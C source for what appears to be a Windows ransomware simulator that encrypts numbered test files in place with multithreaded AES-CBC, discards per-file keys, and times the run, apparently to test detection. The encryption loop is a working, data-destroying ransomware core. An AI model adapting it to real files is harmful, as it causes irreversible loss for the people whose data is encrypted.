#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <process.h>

#pragma comment(lib, "bcrypt.lib")

static char  g_dir[260];
static int   g_count;
static int   g_perfile;
static int   g_holdms;
static volatile LONG g_next;
static BCRYPT_ALG_HANDLE g_alg;

static const unsigned char g_iv0[16] = {
    0x10, 0x32, 0x54, 0x76, 0x98, 0xBA, 0xDC, 0xFE,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF
};
static const unsigned char g_reuse_key[32] = {
    0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7,
    0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7,
    0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7,
    0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7
};

static void encrypt_one(int i)
{
    char path[300];
    HANDLE h;
    DWORD sz, blk, got = 0, put = 0;
    unsigned char *buf, *out, key[32], iv[16];
    BCRYPT_KEY_HANDLE k = NULL;
    ULONG ol = 0;

    _snprintf_s(path, sizeof(path), _TRUNCATE, "%s\\rf%d.dat", g_dir, i);
    h = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return;

    sz = GetFileSize(h, NULL);
    blk = sz & ~15u;
    buf = (unsigned char *)malloc(blk);
    out = (unsigned char *)malloc(blk);
    if (!buf || !out) { CloseHandle(h); free(buf); free(out); return; }

    SetFilePointer(h, 0, NULL, FILE_BEGIN);
    ReadFile(h, buf, blk, &got, NULL);

    if (g_perfile)
        BCryptGenRandom(NULL, key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    else
        memcpy(key, g_reuse_key, 32);
    memcpy(iv, g_iv0, 16);

    BCryptGenerateSymmetricKey(g_alg, &k, NULL, 0, key, 32, 0);
    BCryptEncrypt(k, buf, blk, NULL, iv, 16, out, blk, &ol, 0);

    SetFilePointer(h, 0, NULL, FILE_BEGIN);
    WriteFile(h, out, ol, &put, NULL);
    FlushFileBuffers(h);

    if (g_holdms)
        Sleep(g_holdms);

    BCryptDestroyKey(k);
    SecureZeroMemory(key, sizeof(key));
    CloseHandle(h);
    free(buf);
    free(out);
}

static unsigned __stdcall worker(void *arg)
{
    (void)arg;
    for (;;) {
        LONG i = InterlockedIncrement(&g_next) - 1;
        if (i >= g_count)
            break;
        encrypt_one((int)i);
    }
    return 0;
}

int main(int argc, char **argv)
{
    int threads, i;
    HANDLE *th;
    LARGE_INTEGER f, t0, t1;
    double ms;

    if (argc < 6) {
        printf("usage: ransom_sim <dir> <count> <perfile|reuse> <holdms> <threads>\n");
        return 1;
    }
    strncpy_s(g_dir, sizeof(g_dir), argv[1], _TRUNCATE);
    g_count = atoi(argv[2]);
    g_perfile = (strcmp(argv[3], "perfile") == 0);
    g_holdms = atoi(argv[4]);
    threads = atoi(argv[5]);
    if (threads < 1) threads = 1;
    g_next = 0;

    BCryptOpenAlgorithmProvider(&g_alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(g_alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    th = (HANDLE *)malloc(threads * sizeof(HANDLE));
    QueryPerformanceFrequency(&f);
    QueryPerformanceCounter(&t0);
    for (i = 0; i < threads; i++)
        th[i] = (HANDLE)_beginthreadex(NULL, 0, worker, NULL, 0, NULL);
    WaitForMultipleObjects(threads, th, TRUE, INFINITE);
    QueryPerformanceCounter(&t1);
    for (i = 0; i < threads; i++)
        CloseHandle(th[i]);

    ms = (double)(t1.QuadPart - t0.QuadPart) * 1000.0 / (double)f.QuadPart;
    printf("attacked %d files in %.1f ms (%.0f files/s) mode=%s hold=%dms threads=%d\n",
           g_count, ms, ms > 0 ? g_count * 1000.0 / ms : 0.0,
           g_perfile ? "perfile" : "reuse", g_holdms, threads);

    BCryptCloseAlgorithmProvider(g_alg, 0);
    free(th);
    return 0;
}
